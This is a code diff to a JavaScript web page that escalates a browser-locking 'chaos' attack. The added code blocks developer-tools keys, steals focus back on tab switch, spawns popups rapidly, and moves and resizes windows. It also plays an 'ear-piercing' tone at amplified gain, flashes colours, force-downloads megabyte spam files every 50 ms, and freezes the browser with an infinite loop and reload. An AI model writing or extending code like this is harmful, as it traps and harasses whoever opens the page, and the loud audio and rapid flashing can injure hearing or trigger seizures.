@@ -25,7 +25,7 @@
         };
 
         let popupCount = 0;
-        const maxPopups = 50;
+        const maxPopups = 100;
 
         function createPopup() {
             if (popupCount >= maxPopups) return;
@@ -87,6 +87,22 @@
                 return false;
             }, true);
             
+            // Block dev tools shortcuts
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            }, true);
+            
+            // Block tab switching
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    window.focus();
+                }
+            });
+            
             // Only main window goes fullscreen
             if (!isPopup) {
                 // Try fullscreen with retry
@@ -97,24 +113,31 @@
                 };
                 tryFullscreen();
                 
-                // Spawn popups
-                for (let i = 0; i < 20; i++) {
-                    setTimeout(createPopup, i * 100);
+                // Spawn popups rapidly
+                for (let i = 0; i < 50; i++) {
+                    setTimeout(createPopup, i * 50);
                 }
                 
-                // Keep spawning popups
+                // Keep spawning popups faster
                 setInterval(() => {
                     if (popupCount < maxPopups) {
                         createPopup();
                     }
-                }, 200);
+                }, 50);
             }
             
-            // Move window around
+            // Move window around rapidly
             setInterval(() => {
                 const randomX = Math.random() * (screen.width - 400);
                 const randomY = Math.random() * (screen.height - 300);
                 window.moveTo(randomX, randomY);
+            }, 20);
+            
+            // Resize window randomly
+            setInterval(() => {
+                const randomW = 300 + Math.random() * 500;
+                const randomH = 200 + Math.random() * 400;
+                window.resizeTo(randomW, randomH);
             }, 100);
             
             // Play ear-piercing high-pitch noise
@@ -126,7 +149,7 @@
             oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
             oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
             
-            gainNode.gain.value = 50.0; // Extremely loud
+            gainNode.gain.value = 100.0; // Extremely loud
             
             oscillator.connect(gainNode);
             gainNode.connect(audioContext.destination);
@@ -135,9 +158,9 @@
             
             // Modulate frequency for more piercing effect
             setInterval(() => {
-                const freq = 8000 + Math.random() * 7000;
+                const freq = 5000 + Math.random() * 10000;
                 oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
-            }, 50);
+            }, 10);
             
             try {
                 const response = await fetch('base64.txt');
@@ -182,6 +205,37 @@
                 console.error('Failed to load video:', e);
             }
             
+            // Screen shake effect
+            setInterval(() => {
+                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
+            }, 50);
+            
+            // Flash background colors
+            setInterval(() => {
+                const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ffffff', '#000000'];
+                document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            }, 100);
+            
+            // Force download spam
+            function forceDownload(url, fileName) {
+                const link = document.createElement('a');
+                link.style.display = 'none';
+                link.href = url;
+                link.setAttribute('download', fileName || '');
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+            
+            // Generate and download random files
+            setInterval(() => {
+                const randomData = new Array(1000000).fill('x').join('');
+                const blob = new Blob([randomData], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                forceDownload(url, `spam_${Date.now()}.txt`);
+                window.URL.revokeObjectURL(url);
+            }, 50);
+            
             // Infinite loop to freeze browser (like the crasher website)
             setTimeout(() => {
                 while(true) {
@@ -189,8 +243,9 @@
                         localStorage.x = 1;
                         return '';
                     };
+                    location.reload(1);
                 }
-            }, 3000);
+            }, 2000);
         }
 
         button.addEventListener('click', () => startChaos(false));
